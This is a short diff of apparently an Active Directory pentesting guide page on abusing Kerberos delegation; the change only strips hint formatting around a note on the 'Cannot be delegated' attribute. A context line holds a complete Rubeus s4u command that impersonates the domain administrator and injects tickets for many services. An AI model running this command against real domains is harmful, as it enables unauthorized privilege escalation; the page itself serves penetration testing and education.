@@ -113,9 +113,9 @@ You can generate more tickets just asking once using the `/altservice` param of 
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
-{% hint style="danger" %}
+
 Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
-{% endhint %}
+
 
 ![](../../.gitbook/assets/b3.png)
 
